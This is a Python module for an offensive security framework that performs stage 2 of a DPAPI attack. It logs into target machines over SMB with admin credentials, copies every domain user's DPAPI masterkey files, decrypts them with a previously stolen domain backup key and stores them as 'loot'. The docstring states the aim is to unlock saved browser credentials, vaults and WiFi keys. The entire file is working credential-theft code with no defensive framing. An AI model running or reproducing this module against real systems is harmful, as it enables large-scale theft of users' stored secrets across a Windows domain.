"""DPAPI masterkey looting: every domain user's masterkeys, with the
domain backup key (DPAPI stage 2).

Stage 1 (dpapi_backupkey) pulls the domain's backup key PAIR. This is
the payoff: every domain user who has ever used DPAPI on a machine has
a masterkey file under their profile, and every one of those unwraps
with that ONE key — Chrome credentials, vaults, WiFi keys, saved
everything. This module walks the target's profiles over SMB and
returns the decrypted 64-byte masterkeys (hex, looted). The crypto
lives in core/dpapi.py (shared with stage 3): RSA unwrap proves
padding + cbMasterKey==64, so a wrong backup key never masquerades as
a win.
"""

from core import dpapi as dpapix
from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None  # console gates run() on requirements


class DpapiMasterkeys(AuxiliaryModule):
    name = "DPAPI Masterkey Loot (domain backup key)"
    description = """
        Walks a target's user profiles over SMB and decrypts every
        domain DPAPI masterkey with the domain backup key (latest
        dpapi-backupkey loot, or KEY_LOOT to pick one). Each key must
        pass RSA padding + structure checks before landing in loot —
        the keys that open every domain DPAPI blob on that box (stage
        3 material: dpapi_credentials spends them).
    """
    authors = ["you"]
    requirements = ["impacket", "Cryptodome"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) with profiles, "
                                                "comma-separated"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Target admin"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("KEY_LOOT", default="",
                                   description="dpapi-backupkey loot label "
                                               "(blank = latest)"))

    def run(self):
        store = getattr(self.framework, "store", None)
        backup_key = self._backup_key(store)
        if backup_key is None:
            return
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._loot_host(host, backup_key, store)

    def _backup_key(self, store):
        key, reason = dpapix.find_backup_key(
            store, str(self.get_option("KEY_LOOT") or "").strip())
        if key is None:
            self.print_error(reason)
        return key

    def _loot_host(self, host, backup_key, store):
        try:
            conn = SMBConnection(host, host,
                                 sess_port=int(self.get_option("RPORT")),
                                 timeout=20)
            conn.login(str(self.get_option("USERNAME")),
                       str(self.get_option("PASSWORD")),
                       str(self.get_option("DOMAIN") or "."))
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            for user_dir in self._list(conn, "Users\\*"):
                if user_dir in (".", "..", "Public", "Default",
                                "Default User", "All Users"):
                    continue
                protect = f"Users\\{user_dir}\\AppData\\Roaming" \
                    "\\Microsoft\\Protect"
                for sid_dir in self._list(conn, f"{protect}\\*"):
                    if sid_dir in (".", ".."):
                        continue
                    self._loot_sid(conn, host, user_dir, protect,
                                   sid_dir, backup_key, store)
        finally:
            conn.close()

    def _loot_sid(self, conn, host, user_dir, protect, sid_dir,
                  backup_key, store):
        found = 0
        for entry in self._list(conn, f"{protect}\\{sid_dir}\\*"):
            if not dpapix.is_guid_name(entry):
                continue
            try:
                buf = []
                conn.getFile("C$",
                             f"{protect}\\{sid_dir}\\{entry}", buf.append)
                data = b"".join(buf)
            except Exception:
                continue
            try:
                guid, masterkey = dpapix.decrypt_masterkey_file(
                    data, backup_key)
            except Exception as e:
                self.print_debug(f"{host}: {user_dir}/{entry}: {e}")
                continue
            if masterkey is None:
                if guid is None:
                    self.print_debug(f"{host}: {user_dir}/{entry}: no "
                                     f"domain backup blob (local account) "
                                     f"— skipped")
                else:
                    self.print_error(f"{host}: {user_dir}/{entry}: backup "
                                     f"key didn't fit (wrong key?)")
                continue
            found += 1
            self.print_good(f"{host}: {user_dir} [{sid_dir}] {guid}: "
                            f"masterkey decrypted")
            if store is not None:
                store.add_loot("masterkey",
                               f"dpapi masterkey {user_dir}/{sid_dir}/"
                               f"{guid} @ {host}",
                               masterkey.hex(), address=host)
        if found:
            self.print_status(f"{host}: {user_dir}: {found} masterkey(s) "
                              f"in loot")

    def _list(self, conn, pattern):
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)]
        except Exception:
            return []
